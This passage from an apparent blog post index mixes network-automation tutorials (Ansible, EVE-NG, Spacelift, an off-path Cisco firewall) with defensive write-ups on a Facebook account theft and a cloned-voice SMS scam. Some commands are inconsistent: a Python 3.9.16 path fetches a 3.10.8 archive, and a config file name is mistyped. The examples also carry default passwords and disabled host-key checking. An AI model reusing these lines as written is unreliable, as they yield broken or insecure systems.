draft remediation plan from Nessus outputs; Provisioning lines for a service provider using Cisco XR technology (I chose Ansible to allow the network team to autonomously modify the playbooks); Migrating a backbone for a service provider to Cisco XR technology (I chose Ansible for device provisioning and PyATS + Genie for validating around 140 devices). All of these projects can be grouped into two categories which I call:\nSingle task automation; Process automation. The difference between the two is substantial.\nSingle task automation I call single task automation an activity that arises from a purely personal need, aimed at automating a series of activities (tasks) of the individual themselves. In most cases, automation in a company starts like this: there are repetitive tasks, and if the person performing them is particularly creative, they will write a small software to automate those tasks. Let\u0026rsquo;s look at its characteristics:\nOne-shot; Based on procedural scripts, written to solve a task, and generally not reusable; Aimed at personal use; Does not involve the team but remains confined to the individual; Not included in any procedure; Closely linked to the person who developed it. In short:\nEasy to implement (pro); Does not scale, causing a proliferation of scripts, and is limited to specific tasks (con). What characterizes this type of automation the most is its short lifecycle: born out of the individual\u0026rsquo;s need and almost never reaching the level of a process, once the author changes roles or companies, the automation ceases.\nI can affirm that, despite the very high number of hours saved, 80% of my automation projects died as soon as I changed roles or companies.\nProcess automation I call process automation the automation, possibly arising from single task automation, which is accepted at the company level and therefore becomes the way to perform one or more specific tasks. The scripts are documented, maintained, and used by a team of people. But not only that: the scripts are the only authorized way to perform associated tasks. Let\u0026rsquo;s see its characteristics:\nAutomation is based on company-approved and vulnerability-monitored frameworks; People cannot act except through approved scripts, and in emergency situations, this could be a problem; Compared to total freedom, scripts offer little or no freedom of movement, and in emergency situations, this could be a problem; Script changes are only allowed with prior authorization and testing; Automation is approved by the company and defined as a standard. In short:\nThe process is defined, standardized, less subject to human errors, and, especially thanks to some frameworks, self-documented (pro); Automation development is generally slower due to the number of people involved in defining the process, standardization, and development. In the long run, automation removes expertise, as people get used to using scripts and lose sight of the underlying world. ","cover":"/blog/2023/09/27/task-and-process-automation/gs1280.webp","permalink":"https://www.adainese.it/blog/2023/09/27/task-and-process-automation/","title":"Task and process automation"},{"categories":["personal-security"],"contents":"This is the story of Vittoria (a pseudonym, henceforth referred to as V). A few days ago, V called me in an emergency: her Facebook account had been stolen by Nhang (a pseudonym, henceforth referred to as N). Identity theft is a criminal offense, sanctioned by Article 494 of the Penal Code. This information will be useful later on.\nFor those who use Facebook for their work, such an event is extremely traumatic and must be handled with all due caution.\nThe Facts Wednesday, V receives notifications on Facebook warning her of abnormal activity on her account. V followed the instructions by reporting the suspicious activity, but being on a mobile device, she was unable to change the password or activate multi-factor authentication. Thursday, 7:37 PM: Verify your payment method to resume posting ads ( Attachment 1 ) Thursday, 7:39 PM: Have you just added an email address? ( Attachment 2 ) Friday, 12:38 AM: Have you just removed your phone number? ( Attachment 3 ) Friday, 12:39 AM: Have you just removed your email address? ( Attachment 4 ) From this point on, V can no longer access her account either from her computer or her phone. Additionally, V notices that the account now displays the name and surname of N.\nWe can imagine what happened:\nV\u0026rsquo;s password was stolen. This action is possible through numerous techniques ranging from simple phishing portals, the use of more or less public data breaches, to the use of so-called Infostealers. V\u0026rsquo;s account was not protected with multi-factor authentication (MFA). N was able to access V\u0026rsquo;s account and, by changing the password, email, and phone number, locked out V. Facebook\u0026rsquo;s First Failure For those working in the field of cybersecurity, these types of events represent a series of indicators that, given V\u0026rsquo;s typical behavior, indicate a compromise (commonly referred to as Behavioral Indicators of Compromise or BIoC). Trying to describe the mechanism simply, each event receives a score, and the group of events is evaluated not individually, but based on the group score.\nSpecifically:\nIf an Italian profile, with accesses only from Italy, is accessed from Vietnam, the event is highly suspicious and we assign it a score of 9/10. If a user changes their account password and has never done so before, the event may be suspicious and we assign it a score of 1/10. If a user replaces an email, the event may be suspicious and we assign it a score of 6/10. If a user removes or replaces their phone number, the event may be suspicious and we assign it a score of 6/10. If a user replaces their profile\u0026rsquo;s name and surname in a radically different way, the event is highly suspicious and we assign it a score of 9/10. It doesn\u0026rsquo;t take a security expert to understand that these 5 events, taken together, conclusively determine a compromise of the account.\nFacebook\u0026rsquo;s First Attempt and Failure For each event described in the facts paragraph, Facebook sent V an email: by clicking on the \u0026ldquo;Not me\u0026rdquo; link, a procedure was triggered that should have allowed V to undo the actions and regain control of her account.\nBut it didn\u0026rsquo;t go that way.\nV had to send Facebook, via webcam, a live recording of her identity document. But Facebook\u0026rsquo;s automatic system deemed the information insufficient to recognize V and restore her account access, leaving it with N.\nAgain, it doesn\u0026rsquo;t take a security expert to understand that if V uses an official Facebook email to report fraudulent activity, it is highly likely that the event was indeed fraudulent, and the account modification actions should be reversed.\nAccount Recovery and Facebook\u0026rsquo;s Failure V had two more Facebook emails with links to attempt account recovery. Another attempt failed, but with some difficulty, V managed to activate the third recovery procedure. V now chooses to use not the identity document that always appeared blurred, but the passport: she takes the time to take a good photo of the document with her phone, and this time Facebook recognizes V\u0026rsquo;s identity and sends her two emails for recovery:\nNew email address added to Facebook ( Attachment 5 ). You can now access your account again ( Attachment 6 ). These two emails should be used in the exact order described above: first, the email address must be confirmed with the corresponding confirmation code, then access to the account can be regained with the temporary password and PIN provided in the email.\nBut it\u0026rsquo;s not over yet.\nV manages to access the account, but the email change procedure fails. So, she finds an account:\nfor which she does not know the password (the one in the email is a temporary password to be used once); associated with N\u0026rsquo;s email; associated with N\u0026rsquo;s phone number. V soon realizes that any attempt to change the password, replace the email, or phone number requires a password, but not the one she possesses; the password requested is the one used by N to lock V out.\nHowever, there is a procedure to proceed even without knowing the password, but it requires a confirmation PIN, sent to N\u0026rsquo;s email or phone.\nIn a moment of desperation and intuition at the same time, V tries again to open the Facebook app from her phone, which automatically logs into Facebook but requires confirmation from an already open session. Now V can authorize access from the phone using the previously opened session on the computer, and in no time, V manages to change the email, phone number, and set up multi-factor authentication.\nBut V cannot change the name and surname for two months: it\u0026rsquo;s a Facebook security policy. V will be presented to her friends as Nhang for two months.\nOther Facebook Failures In retrospect, I can say that V, despite claiming to have difficulty with technology, reacted well: she had a good degree of autonomy, had excellent insights, and did not get discouraged. And yes, considering how Facebook\u0026rsquo;s security systems don\u0026rsquo;t work, she was also very lucky.\nSo let\u0026rsquo;s see the other failures of Facebook:\nThere is an official procedure by Facebook for recovering stolen accounts: however, it requires entering the email address or phone number associated with the stolen account. Since they were changed by N, V did not know them. Sending the document is done through Facebook: for some reason, the ID document capture was blurred, despite V having a latest-generation phone. Capturing the passport, much larger than the electronic identity card, was a brilliant intuition by V. Criminal Offense Identity theft is a criminal offense that should be reported. Not so much because there is hope that Italian authorities can act on Facebook, but because the stolen profile could be used for crimes. It is therefore necessary to be able to demonstrate that one is no longer in possession of that account from a specific date.\nV went to the authorities to report the incident, but she was unable to assert her rights.\nLesson Learned Lately, I have often dealt with what I call the technofascism of social platforms, where a series of poorly written automatisms and a strong interest in surveillance arbitrarily or causally erase people\u0026rsquo;s rights.\nHowever, I understand that some people choose to use such platforms for specific reasons. And to these people, I appeal to prevent potential scams.\nIn my approach to digital security, there are two types of accounts:\nthose linked to my identity that must be protected with secure, unique passwords, and, where possible, multi-factor authentication; disposable accounts, not linked to my personal identity, which I protect with fictitious data, secure passwords, and, where possible, multi-factor authentication. It is said that prevention is better than cure, and in these cases, it is truer than ever: as evidenced by this article, recovering a stolen account is a mix of stubbornness and luck. To be extremely transparent: few accounts are recovered.\nIn summary, if your account is stolen:\nseek help; do not act in an emergency, take the time to act correctly (for us, it was essential to operate from a computer while keeping the phone as a support); use the recovery emails sent by the platform; once access is recovered, cut off your attacker (ask for advice); if possible, use the official procedure, activating it daily and, if necessary, for months. An Open Question There was an open question that initially was not clear: what sense does it make to steal a Facebook account, change its name without asking for a ransom? In other words: where is the economic benefit in doing this type of operation?\nThe answer came a few days later: the criminal had used the Facebook account to add a credit card, unknown to V and probably stolen, to create and pay for promotional campaigns.\n","cover":"/blog/2023/09/26/theft-and-recovery-of-a-facebook-account/evidence4.webp","permalink":"https://www.adainese.it/blog/2023/09/26/theft-and-recovery-of-a-facebook-account/","title":"Theft and recovery of a Facebook account"},{"categories":["automation"],"contents":"In this article, we present an initial example of executing mass commands using Ansible on Cisco IOS devices. We will utilize the pre-configured \u0026ldquo;Cisco Legacy Core-Access topology\u0026rdquo; lab available in the repository DevNetOps course material:\nFirstly, we need to create an inventario. At this stage, we won\u0026rsquo;t delve deeply into the topic, but simply create a file containing all the devices present in the lab and the necessary variables, such as:\nansible_host: the IP address of the device, as we don\u0026rsquo;t have a DNS system for automatic resolution; ansible_user: the user (admin) to access the device; ansible_ssh_pass: the password (cisco) to access the device; ansible_connection: the connection mode Ansible should use to connect; ansible_network_os: the type of device. The inventory.yml file will look like this:\nall: hosts: sw1.example.com: ansible_host: 169.254.1.101 ansible_user: admin ansible_ssh_pass: cisco ansible_connection: ansible.netcommon.network_cli ansible_network_os: cisco.ios.ios Since we are working with devices that only support outdated algorithms, we need to specifically enable them. We will do this by working on an SSH client config file named ansible_libssh.conf:\nKexAlgorithms diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 HostKeyAlgorithms ssh-rsa,ssh-dss Host * ServerAliveInterval 5 ServerAliveCountMax 3 In theory, it would be sufficient to specify only the algorithms to add, prepending the symbol +. However, in my tests, this syntax might cause issues. Therefore, I suggest defining all the algorithms we will need in our tests.\nThe ansible_libssh.conf file will be referenced by the ansible.cfg file, which defines the settings of the libssh library:\n[persistent_connection] ssh_type = libssh [libssh_connection] host_key_checking = false look_for_keys = false config_file = ../ansible_libssh_conf Next, we start the nodes and verify that they are reachable:\nansible all -i inventory.yml -m ping The above command executes a so-called ad-hoc command. In other words, we ran the ping command on all devices configured in the inventory.\nSimilarly, we can decide to execute a command on all devices:\nansible all -i inventory.yml -m cisco.ios.ios_command -a \u0026#34;commands=\u0026#39;show version\u0026#39;\u0026#34; We can adjust the number of parallel processes running the playbook. This number depends on available resources, particularly the number of CPUs, but not limited to that. Running a playbook involves \u0026ldquo;idle times,\u0026rdquo; i.e., time when the Ansible machine is waiting for output from the device. For Cisco devices, consider the time elapsed from entering the show running-config command to actually seeing the output on the screen. Therefore, we can safely increase the number of forks to double the available processors without risking overloading the Ansible controller:\n[defaults] forks = 8 ","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2023/09/25/one-time-commands-on-cisco-ios-with-ansible/","title":"One-time commands on Cisco IOS with Ansible"},{"categories":["automation"],"contents":"Ansible is distributed as a Python module installable via PIP. The installation process is straightforward but warrants some considerations.\nTypically, the automation host, the system from which all automation scripts originate, is one of the most critical systems within an infrastructure. It can access all systems that need to be automated and often, for convenience, contains the credentials for these devices. While credentials are stored in specific password managers, more often than not, they are found in plaintext.\nFor simplicity and clarity, the simplest playbooks contain device credentials. They are designed to focus on the automation aspect rather than the security of the system, which will be discussed in specific articles.\nHowever, we can start with a best practice: creating a dedicated Python environment for Ansible and tracking the versions of installed packages. Ansible, like many other software, is continuously evolving, and playbooks written today may not function correctly with future versions.\nThe version of Ansible we will use requires Python 3.9, which is not installable via APT on Ubuntu Linux 20. Therefore, we need to install it manually from sources:\ncd /usr/src wget https://www.python.org/ftp/python/3.9.16/Python-3.10.8.tgz tar xzf Python-3.10.8.tgz cd Python-3.10.8/ ./configure --enable-optimizations make -j 4 sudo make altinstall The updated packages.txt file is available in the DevNetOps course material, which can be used to install the necessary dependencies for all available labs.\nsudo apt-get install -y \u0026lt; packages.txt In general, it\u0026rsquo;s preferable to have a dedicated user for Ansible usage to ensure its environment is configured and reliable. Let\u0026rsquo;s create a new user:\nsudo useradd -m -d /opt/ansible -s /bin/bash ansible sudo su - ansible Now, we can prepare the Python environment and install Ansible:\npython3.10 -m venv .venv source .venv/bin/activate pip install ansible ansible-pylibssh pip freeze | grep ansible ansible --version The updated requirement.txt file is available in the DevNetOps course material, which can be used to install the necessary dependencies for all available labs.\npip -r requirement.txt Remember to activate the newly created Python environment before running Ansible:\nsource .venv/bin/activate You can deactivate the environment using the following command:\ndeactivate Since we\u0026rsquo;re using a dedicated user, we can load the virtual environment directly at login by adding the following command to .bashrc:\nsource .venv/bin/activate ","cover":"/images/vendors/ansible.webp","permalink":"https://www.adainese.it/blog/2023/09/24/installing-ansible/","title":"Installing Ansible"},{"categories":["automation"],"contents":"The first step to work in the IT field today is to set up a laboratory. EVE-NG (formerly UNetLab) can be used for network, network security, and automation labs.\nEVE-NG is based on Ubuntu Linux 20.04 LTS and is therefore an excellent exercise to learn how to install and customize a Linux environment entirely from the command line. Installing EVE-NG is simplified compared to a normal EVE-NG installation, but it\u0026rsquo;s a great starting point. Furthermore, our goal is to learn how to manage a Linux system, whatever it may be; therefore, we are not interested in focusing on the specific installation of various distributions unless in special cases.\nResources The resources required for our EVE-NG installation will increase as we build increasingly complex labs. We will start with:\n4 CPUs 8GB of RAM 50GB of disk space EVE-NG can be installed directly on dedicated hardware (laptop, desktop, server) or on a virtual machine. Initially, using a virtual machine is sufficient, but as resources grow, dedicated hardware will be necessary.\nThe article continues assuming the installation of EVE-NG via the Community Edition ISO file, downloadable from the official page.\nCreating the virtual machine on VMware vSphere To begin, my advice is to use the VMware suite, choosing between VMware vSphere (if your company can allocate resources for it) or VMware Workstation Player (if your computer runs on Microsoft Windows). Simpler labs can be run on Amazon AWS, Microsoft Azure, or Google GCE virtual machines, but I would discourage this option due to costs: labs will often be running, consuming many resources, and some may simply not work on these platforms.\nIf your computer is based on Apple Silicon processors, it will not be possible to run the lab locally. This is because most labs require running x86 code natively: virtualization systems would run this code in emulation and thus be too slow.\nConnect to our vCenter or directly to our ESXi host and create the EVE-NG-CE virtual machine:\nAssign resources (CPU, RAM, disk, network adapter):\nIn my case, I previously copied the installation file to the ESXi server\u0026rsquo;s datastore; alternatively, you could map the CD/DVD drive of the virtual machine with a file residing on the desktop you are working from. This operation is feasible only if you are connected at high speed to your ESXi server\u0026rsquo;s network (and thus not over VPN).\nIf everything has been set up correctly, the virtual machine should present the boot loader screen customized by EVE-NG upon boot:\nInstalling EVE-NG Now let\u0026rsquo;s proceed with the installation of the Linux system customized by EVE-NG. The installation is very simple and, compared to a classic Linux installation, omits several steps. This is because EVE-NG has been industrialized to the point of resembling an appliance. For each configuration, we will make considerations that will help us define standards that are also valid in large and geographically distributed environments.\nIn an Enterprise context, my advice is to always set the language to English. Most utilities contain documentation in this language, and there is no reason to have a server system localized in a different language. Additionally, this forces us to become familiar with this language, which will be useful when searching for documentation.\nThe keyboard should be configured correctly based on the connected hardware. While the choice is straightforward with a physical server, with a virtual machine, the keyboard depends on the client using it. An Enterprise with a team distributed over multiple geographic areas will probably want to standardize on a US keyboard: it\u0026rsquo;s a simple keyboard and fairly easy to remember.\nThe next step is to configure the network interface. In many cases, the automatic option (DHCP) is correct, but in other cases, especially in an Enterprise environment, we may need to configure it statically.\nAnother question concerns the use of local proxy systems, which allow optimizing multiple installations of the same system. While this type of system was once very common, today, thanks to the abundance of fast Internet connectivity, they are much rarer.\nAfter the final confirmation, the installation system will proceed to erase the disk content, overwriting it with the installed system.\nOnce the installation is complete, the system needs to be rebooted:\nAccessing EVE-NG Once the system has rebooted, we can access our EVE-NG installation via a browser and SSH.\nBy default, the credentials are:\nWeb access: URL: http://172.25.82.222, username: admin, password: eve SSH access: IP: 172.25.82.222, username: root, password: eve Upon the first SSH access, we will be prompted to:\nChange the password to a more secure one; Set the machine\u0026rsquo;s hostname (let\u0026rsquo;s keep it eve-ng); Set the machine\u0026rsquo;s domain (let\u0026rsquo;s keep it example.com); Assign the management IP address (enter the information used during installation again); Enter the NTP server to maintain time synchronization (we can use europe.pool.ntp.org). After a second reboot, the machine will be ready to use.\nFor security, remember to change the web user\u0026rsquo;s password to a more secure one. This can be done by logging in via the browser and clicking on the username in the top right corner:\n","cover":"/images/vendors/eve-ng.webp","permalink":"https://www.adainese.it/blog/2023/09/21/installing-eve-ng/","title":"Installing EVE-NG"},{"categories":["personal-security"],"contents":"This post recounts an attempt at fraud via SMS and voice call with a fake voice, targeting an elderly person. Although this type of fraud is not new, the way it was executed deserves further examination. The article aims to be informative and comprehensible, in order to increase awareness among non-professionals.\nI especially thank the friend who allowed me to experience and analyze this type of attack.\nThe Facts The mother (hereafter referred to as M) of a friend (son of M, hereafter referred to as F) receives an SMS at 12:32 that appears to be a simple scam:\nHi Mom, I lost my phone. This is my new number. +393791234567 Please send me a message on WhatsApp. I can be reached there! ( Attachment 1 )\nWe should be trained not to believe in this type of SMS, however, the sender of the message provides the full name of F. This detail makes it more credible.\nAnomalies:\nWhy does a new phone number appear already in M\u0026rsquo;s address book? Why does M have to use WhatsApp instead of a text message or a simpler and more convenient phone call? Understandably, a few minutes later, M responds to the SMS message with a confirmation. Almost instantly, M receives a call from the attacker (hereafter referred to as A). The sender\u0026rsquo;s number is still +393791234567 but the phone displays it with F\u0026rsquo;s name. The voice on the phone is that of F, claiming to have lost the cellphone, dictating the new number, and then hanging up.\nAnomalies:\nWhy is the phone call just a simple monologue from F? Fortunately, shortly thereafter, F goes to M\u0026rsquo;s house, understands the situation, and calls me for advice. The attack is stopped, and the involved individuals are made aware and secured.\nAnalysis The attack drew my attention to two extremely relevant facts that make it extremely credible and effective:\nThe use of F\u0026rsquo;s voice. The cell phone number displayed on the phone with F\u0026rsquo;s full name. By indirectly analyzing the various evidence left by A, I noticed that M\u0026rsquo;s address book contained two entries for F: the first one correct, saved on the cellphone, the second one fake, saved on Gmail. Since the cellphone is an Android, M\u0026rsquo;s address book displays a combination of local and Google elements. Without specific investigations, the elements appear identical. Upon closer examination of the fake element, I noticed that it was created moments before the first SMS.\nAccessing Gmail allows us to see the latest events ( Attachment 2 ):\nWe see that:\nThe first two entries concern me logging in. The one labeled \u0026ldquo;Mobile devices\u0026rdquo; was made near the time of the attack (unfortunately, the details did not allow me to understand exactly when). The next two (Authorized request) relate to applications requesting authorization (via OAuth2) to access part of Google\u0026rsquo;s data. I assume these are applications (websites or installed on the phone) that need to use Google\u0026rsquo;s data, for example: applications for managing contacts, calendars, but also WhatsApp itself that wants to make a backup. In the Google account management, it is possible to check which sessions are active, and in particular which devices are connected ( Attachment 3 ):\nWe see that:\nThe Firefox session on Mac concerns me. The first cellphone (Oppo) is M\u0026rsquo;s. The cellphone SM-G991B concerns F\u0026rsquo;s sister (hereafter referred to as S). In particular, we see that S performed an activity on the Google account on the day of the attack, via Chrome Webview. From there onwards, unfortunately, the Google data was not helpful enough. Checking M\u0026rsquo;s cellphone remotely, I found nothing abnormal; while I find the activity on S\u0026rsquo;s cellphone on the day of the attack to be a very interesting coincidence.\nSecuring The analysis tells us that:\nM\u0026rsquo;s account was violated, as a fake entry was added to the address book. We can assume that all data associated with Google has been compromised. In this specific case, these are: contacts, Google Drive, email. Probably the attack originated from S\u0026rsquo;s cellphone, so the same applies to her Google account. Securing requires:\nthat the involved individuals (M, F, S) are aware of what happened and can identify even more realistic attacks, which will be possible thanks to the data stolen from the two Google accounts; changing the passwords of the two Google accounts; enabling multi-factor authentication (or MFA); deleting all active sessions; removing all connected applications; securing all accounts that have the same password as the Google accounts, are connected to them, or are used within potentially compromised devices. In this specific case, the cellphones were mainly used as phones. I breathed a sigh of relief when I realized that there were no banking applications present.\nThe Attack It is now clear how the attack was structured:\nThrough a compromise of the Google account (via application, vulnerability, or credential theft), the attacker creates a fake entry in the target\u0026rsquo;s address book. The attacker creates an audio file, impersonating the voice of a relative of the target. The attacker sends a series of bait SMS messages, attempting to move the conversation to WhatsApp. To people who respond via SMS (and presumably also to those who respond via WhatsApp), the attacker calls the target using the previously created audio. The attacker tries to convince the target that there is an emergency situation and that they need money, to be sent via bank transfer. If the attack I witnessed was thwarted, a brief investigation led me to understand that it is currently widespread and that unfortunately some elderly parents have fallen into the trap, losing several thousand Euros.\nLesson Learned Current deep learning technologies that allow the creation of audio files with the voices of others are extremely dangerous. Outdated phones and insecure applications provide attackers with tools that allow them to create false identities very easily and effectively.\nWe should expect even more complex attacks, where phone calls are no longer simple monologues but real conversations.\nWe must be able to identify anomalies and perform control tests to understand if the person communicating digitally with us is who they claim to be or if they are simply impersonating someone else based on information easily available on the internet.\nWe must understand that since digital life blends with physical life, it requires the same level of attention: if driving on the road requires a license and attention, \u0026ldquo;driving\u0026rdquo; a cellphone that contains access to the bank account requires the same level of awareness and attention. Saving and using outdated cellphones, not updated or installing anything that appears on the screen out of curiosity, is NOT a good idea and can have serious consequences.\nIn this case, it turned out well, but in others that I have experienced, the attack was successful, and the bank account was emptied.\n","cover":"/blog/2023/09/16/attempted-fraud-via-sms-and-fake-voice/sms.webp","permalink":"https://www.adainese.it/blog/2023/09/16/attempted-fraud-via-sms-and-fake-voice/","title":"Attempted fraud via SMS and fake voice"},{"categories":["automation","infrastructure"],"contents":"Operating on a data center (DC) or backbone Internet Service Provider (ISP) typically involves a significant amount of human effort, resulting in operational costs that are often overlooked. However, these costs can be optimized by harnessing the power of automation to handle simple and repetitive tasks efficiently.\nIt is important to emphasize that while automation brings numerous benefits, it is not a free solution. Each task that is to be automated must go through a well-defined and documented process of task definition. This ensures that every step is clearly articulated and understood.\nTo streamline the automation process and reduce effort, tasks should be categorized and grouped into a small, finite number of possibilities. Each possibility is defined by specific attributes or parameters that differentiate it from others. By doing so, the scope becomes well-defined and manageable, allowing the NetDevOps team to design and implement the automation software effectively.\nThe overall approach to automation can be divided into the following phases:\nAssessment High-level design Low-level design Development Testing and Improving Production The ultimate objective of this approach is to develop an automation system that empowers the customer to continue improving and expanding the automation capabilities independently. The Return on Investment (ROI) of the automation solution can be quantified by measuring the number of tasks that the tool executes, resulting in significant time savings and improved operational efficiency.\nMoreover, beyond cost savings, the automation system provides additional benefits such as self-documentation and standardization of tasks. This not only facilitates audits and compliance requirements but also enables better collaboration, knowledge sharing, and overall operational excellence within the organization.\nAssessment The NetDevOps team collaborates closely with the customer to define the scope of automation and compile a comprehensive list of tasks to be automated. It is crucial for the team to not only audit the existing scope but also suggest potential areas for expansion. This ensures that the automation solution addresses the broader operational needs of the organization.\nHigh-level design Once the scope is defined, the NetDevOps team proceeds to document the tasks within that scope. This documentation provides a clear overview of the tasks and serves as a foundation for the subsequent stages of development.\nLow-level design In this phase, the NetDevOps team, in close collaboration with the customer, defines the specific task parameters. These parameters allow for grouping tasks into a limited number of variability while ensuring comprehensive coverage of the defined scope. Additionally, the development framework to be utilized for the automation solution is selected, considering factors such as scalability, compatibility, and maintainability.\nDevelopment Leveraging a dedicated lab environment, the NetDevOps team begins the development of the automation system. This stage involves programming and configuring the software to execute the defined tasks efficiently. Best practices for coding standards, version control, and documentation are followed to ensure a robust and maintainable solution.\nTesting and Improving The automation system undergoes rigorous testing in the lab environment to identify any bugs, issues, or areas for improvement. Feedback from testing is incorporated into iterative cycles, allowing for continuous enhancement of the automation solution. This stage aims to ensure that the system performs reliably and accurately, meeting the defined requirements and expectations.\nProduction Once the automation system has been thoroughly tested and refined, it is ready for deployment in a production environment. The NetDevOps team, in collaboration with the customer, implements the automation tool on a small subset of scenarios initially. This allows for validation and fine-tuning of the system in real-world operational settings. Once successful, the customer gains autonomy in utilizing the automation system across a broader range of tasks and scenarios.\n","cover":"/images/categories/automation.webp","permalink":"https://www.adainese.it/blog/2023/08/12/speed-up-dc/isp-operation-with-automation/","title":"Speed up DC/ISP operation with automation"},{"categories":["infrastructure"],"contents":"I used to deploy a simple network architecture for two main reasons.\nThey are easy to debug/troubleshoot Engineers who came after can easily understand and manage them. With these rules in mind, I usually deploy in-line firewalls, meaning that traffic is routed through a firewall that is placed \u0026ldquo;in the path\u0026rdquo;:\nSometimes things are complicated, and we need to deploy \u0026ldquo;off-path\u0026rdquo; firewalls, and traffic is partially routed through the firewall:\nThere are many reasons why we want to do so.\nWe want to test a new firewall We do not have enough budget for a big firewall to manage the entire traffic. We must exclude some latency-sensitive traffic. In 99% of the scenarios, an in-line firewall is fine; let us examine how to approach the remaining 1%.\nLocal Internet connection Requisite #1: We need to use the local Internet connection if available and use the MPLS if not.\nSolving this requisite is easy: we must implement a conditional static default route. The firewall is used only if the Internet connection through it is working.\nDepending on the firewall model, we can use native features and dynamic routing to accomplish the configuration. However, for the sake of this post, we want to solve the requisite by acting on the L3 switch only.\nNetwork engineers are used to implement an ICMP probe, reaching 8.8.8.8, to test the Internet connection. I read even official documents suggesting that, but that\u0026rsquo;s a bad practice because Google apply rate limits:\nWe want to implement two DNS probes using at least two different DNS OpenDNS servers.\nip sla 1 dns www.cisco.com name-server 208.67.222.222 source-ip 192.168.1.1 timeout 5000 frequency 10 ip sla schedule 1 life forever start-time now ip sla 2 dns www.google.com name-server 208.67.220.220 source-ip 192.168.1.1 timeout 5000 frequency 10 ip sla schedule 2 life forever start-time now track 1 ip sla 1 reachability track 2 ip sla 2 reachability DNS providers can rate limit requests with unusual record types, excessive duplicate queries, excessive DNS records, or those sent from malicious client IPs to add entropy to our nameserver requests. Because we use a 10 s frequency, we can assume that it is safe.\nWe also need to couple the probes above using the OR logical operator\ntrack 3 list boolean or object 1 object 2 delay down 12 up 30 To avoid flapping, we introduced a delay before changing the state.\nFinally, we configured the default static route associated with the probe.\nip route 0.0.0.0 0.0.0.0 192.168.1.254 track 3 With this configuration, traffic to the Internet is routed through the firewall if the Internet connection via the firewall itself is working. Otherwise, the default route from the MPLS is used.\nAttention should be paid to convergence time, especially when the local Internet connection goes down.\nOff-path firewall filtering Requisite #2: We must selectively filter some network conversations. We cannot forward anything to the firewall because it does not have sufficient bandwidth or computational resources.\nSolving this requirement requires PBR or Policy-Based Routing. We use PBR when we need to make an exception to the normal routing. We want to select, based on protocol, source/destination IP, and port, network flows to be routed through the firewall. The firewall is configured \u0026ldquo;on-a-stick,\u0026rdquo; meaning that a single interface is used to receive and transmit the allowed network traffic.\nWe must define the network traffic to be filtered using an ACL.\nip access-list extended FILTERED permit ip 192.168.20.0 0.0.0.255 any permit ip any 192.168.20.0 0.0.0.255 We must match both ingress and egress traffic. A route map forwards traffic through the firewall.\nroute-map FILTERED permit 10 match ip address FILTERED set ip next-hop verify-availability 192.168.1.254 In a non-HA firewall configuration, we can implement the conditional PBR:\nroute-map FILTERED permit 10 match ip address FILTERED set ip next-hop verify-availability 192.168.1.254 1 track 11 Finally, we need to apply the route map to any L3 interface, excluding the interface where the firewall is placed:\ninterface Ethernet0/1 ip policy route-map FILTERED interface Ethernet0/2 ip policy route-map FILTERED With this configuration, the ingress traffic matching the ACL is forwarded to the firewall.\nConclusions Again, this design should not be used unless specific requirements exist. However, this works well. Automation tools should be considered to manage large environments properly. The more human dependent is, the more errors (and outages) will be.\n","cover":"/blog/2023/03/02/off-path-firewall-with-traffic-engineering/off-path-firewall-w-flows.webp","permalink":"https://www.adainese.it/blog/2023/03/02/off-path-firewall-with-traffic-engineering/","title":"Off-Path firewall with Traffic Engineering"},{"categories":["automation"],"contents":"This is the third part of my IaC overview based on a personal experiment: building Cyber range using the IaC paradigm. Here is the first and second parts.\nA few weeks ago I met Spacelift and I had the chance to test their product. Spacelift is described as:\nCollaborative Infrastructure for modern software teams\nIn practice, Spacelift offers a web UI and a framework to maintain, test, and organize infrastructures using the IaC (Infrastructure as Code) paradigm.\nI decided to adapt my playbooks so they could be managed within Spacelift. Even if I like Spacelift very much, I always plan an exit strategy. In practice, I can run my playbooks outside Spacelift, and this is useful to me for developing, testing, and debugging. I consider this a \u0026ldquo;soft\u0026rdquo; lock-in, and this is very important to me.\nThis post summarizes how I used Spacelift for my simple scenario. Mind that Spacelift is more powerful and can actually cover a lot of complex scenarios.\nStacks: run instances from GitHub From the official doc page:\nStack is one of the core concepts in Spacelift. [\u0026hellip;] You can think about a stack as a combination of source code, the current state of the managed infrastructure (eg. Terraform state file), and configuration in the form of environment variables and mounted files.\nIn my scenario, I need two stacks: one for Terraform and another one for Ansible. I have seen three approaches to build and maintaining stacks:\nfully manual: all stacks are created by humans; fully automated: all stacks are created by Terraform; hybrid: the main stack create secondary tasks. In the fully automated approach, all stacks and relationships between them are created by Terraform. Everything around Spacelift can be managed with the IaC paradigm, so this could be the best way for many DevOps engineers. Sometimes the \u0026ldquo;builder\u0026rdquo; stacks are managed within Spacelift too: in this case, the stack which can manipulate Spacelift projects must be administrative.\nIn my scenario, I used a hybrid approach: the main stack builds dependent stacks and the relationship between them, but it also creates the AWS infrastructure. In short, my Terraform stack:\nis created manually from a GitHub repository; is triggered on every GitHub commit; after the plan phase a manual confirmation is required; is responsible to build the Ansible stack and related policies and environments; is responsible to build the AWS infrastructure; is responsible to trigger the Ansible stack. Let\u0026rsquo;s see how to build the Terraform stack:\nProvider: GitHub Repository: dainok/iac Branch: master Project root: lab-all-in-one-vulnerable-website Backend: Terraform Administrative: true Name: lab-all-in-one-vulnerable-website Once it has been created, the stack can be triggered:\nEnvironment and context Spacelift stacks can be configured with environment variables (within the stack itself) or context (a sort of shared environment). My approach is to define context containing data that can be shared between stacks:\nContext can contain both environment variables and files. In my scenario I use:\na context defining Spacelift API token; a context defining AWS API token; a context built by the Terraform stack sharing some data between the Terraform and the Ansible stack. To be more specific the last context is used to share the SSH private key with the Ansible stack and to set some Ansible environment variables.\nPolicies: binding Terraform and Ansible together Spacelift uses an open-source project called Open Policy Agent and its rule language, Rego, to execute user-defined pieces of code we call Policies at various decision points.\nPolicies can be used to modify the stack behavior. For example, additional security checks can be implemented, or a specific user is required to approve the plan. In my case I used:\na push policy to avoid automatic triggering of the Ansible stack after a commit; a trigger policy to run the Ansible stack after the Terraform one. In the end I have two different stacks, one created automatically:\nThe Ansible stack is automatically triggered:\nManual actions My scenario requires I destroy my lab after each Twitch session. In the Terraform stack I can run single tasks:\nEverything good? The Ansible implementation is still in beta; besides that, I was able to reach my goals. I found some issues, but the Spacelift team help me to fix all of them or to find good workarounds. No software is perfect, but the most important thing to me is how the vendor supports me when I encounter bugs or issues.\nConclusions I found Spacelift an interesting framework to manage IaC within enterprises. It contains a lot of security checks, and integrations, and it supports private workers (no need for a public bastion host). 